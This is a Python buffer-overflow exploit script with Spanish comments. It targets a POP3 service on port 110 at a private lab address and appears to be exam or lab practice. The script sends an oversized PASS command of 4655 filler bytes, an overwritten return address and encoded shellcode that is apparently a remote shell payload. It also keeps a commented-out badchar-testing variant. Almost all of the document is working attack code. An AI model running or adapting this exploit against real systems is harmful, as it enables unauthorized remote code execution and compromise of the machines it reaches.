#!/usr/bin/python3

import socket
import sys
from struct import pack

# Definimos la dirección IP del objetivo, el puerto y otros parámetros necesarios
ip_address = "192.168.68.129"  # IP del objetivo ********Cambiar esto********
port = 110  # Puerto del objetivo  ********Cambiar esto********


off_set = 4655  # Desplazamiento para alcanzar EIP

EIP = pack("<L", 0x5F4B5663)  # Dirección de retorno en little endian

shellcode = (b"\xda\xc0\xd9\x74\x24\xf4\xb8\x8d\xf5\x27\xcc\x5d"  #Shell code omitiendo  \x00\x0a\x0d
b"\x33\xc9\xb1\x52\x83\xc5\x04\x31\x45\x13\x03\xc8"
b"\xe6\xc5\x39\x2e\xe0\x88\xc2\xce\xf1\xec\x4b\x2b"
b"\xc0\x2c\x2f\x38\x73\x9d\x3b\x6c\x78\x56\x69\x84"
b"\x0b\x1a\xa6\xab\xbc\x91\x90\x82\x3d\x89\xe1\x85"
b"\xbd\xd0\x35\x65\xff\x1a\x48\x64\x38\x46\xa1\x34"
b"\x91\x0c\x14\xa8\x96\x59\xa5\x43\xe4\x4c\xad\xb0"
b"\xbd\x6f\x9c\x67\xb5\x29\x3e\x86\x1a\x42\x77\x90"
b"\x7f\x6f\xc1\x2b\x4b\x1b\xd0\xfd\x85\xe4\x7f\xc0"
b"\x29\x17\x81\x05\x8d\xc8\xf4\x7f\xed\x75\x0f\x44"
b"\x8f\xa1\x9a\x5e\x37\x21\x3c\xba\xc9\xe6\xdb\x49"
b"\xc5\x43\xaf\x15\xca\x52\x7c\x2e\xf6\xdf\x83\xe0"
b"\x7e\x9b\xa7\x24\xda\x7f\xc9\x7d\x86\x2e\xf6\x9d"
b"\x69\x8e\x52\xd6\x84\xdb\xee\xb5\xc0\x28\xc3\x45"
b"\x11\x27\x54\x36\x23\xe8\xce\xd0\x0f\x61\xc9\x27"
b"\x6f\x58\xad\xb7\x8e\x63\xce\x9e\x54\x37\x9e\x88"
b"\x7d\x38\x75\x48\x81\xed\xda\x18\x2d\x5e\x9b\xc8"
b"\x8d\x0e\x73\x02\x02\x70\x63\x2d\xc8\x19\x0e\xd4"
b"\x9b\xe5\x67\x92\x3c\x8e\x75\x1a\xc7\x9c\xf3\xfc"
b"\xad\x30\x52\x57\x5a\xa8\xff\x23\xfb\x35\x2a\x4e"
b"\x3b\xbd\xd9\xaf\xf2\x36\x97\xa3\x63\xb7\xe2\x99"
b"\x22\xc8\xd8\xb5\xa9\x5b\x87\x45\xa7\x47\x10\x12"
b"\xe0\xb6\x69\xf6\x1c\xe0\xc3\xe4\xdc\x74\x2b\xac"
b"\x3a\x45\xb2\x2d\xce\xf1\x90\x3d\x16\xf9\x9c\x69"
b"\xc6\xac\x4a\xc7\xa0\x06\x3d\xb1\x7a\xf4\x97\x55"
b"\xfa\x36\x28\x23\x03\x13\xde\xcb\xb2\xca\xa7\xf4"
b"\x7b\x9b\x2f\x8d\x61\x3b\xcf\x44\x22\x5b\x32\x4c"
b"\x5f\xf4\xeb\x05\xe2\x99\x0b\xf0\x21\xa4\x8f\xf0"
b"\xd9\x53\x8f\x71\xdf\x18\x17\x6a\xad\x31\xf2\x8c"
b"\x02\x31\xd7")

ESP=(b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21"  #Badchars = \x00\x0a\x0d
b"\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41"
b"\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61"
b"\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81"
b"\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1"
b"\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1"
b"\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1"
b"\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

def exploit():
    # Creamos un socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Conectamos al objetivo
    s.connect((ip_address, port))

    # Recibimos e imprimimos el banner
    banner = s.recv(1024)
    # print(banner)

    # Enviamos el usuario en formato de bytes
    s.send(b"USER b3xal" + b'\r\n')  # El retorno de carro y salto de línea es equivalente a presionar enter y enviar los datos

    # Recibimos la respuesta
    response = s.recv(1024)
    # print(response)

  
    '''# Enviamos la contraseña, enviando un monótono de A = 0x41 con ESP para verificación de badchars
    s.send(b"PASS" + b"A" * off_set + EIP + ESP + b'\r\n')'''
  
    # Enviamos la contraseña, enviando un monótono de A = 0x41 con un desplazamiento y dirección de retorno específicos, y el shellcode
    s.send(b"PASS" + b"A" * off_set + EIP + b"\x83\xEC\x10" + shellcode + b'\r\n')

if __name__ == '__main__':
    # Llamamos a la función de exploit
    exploit()
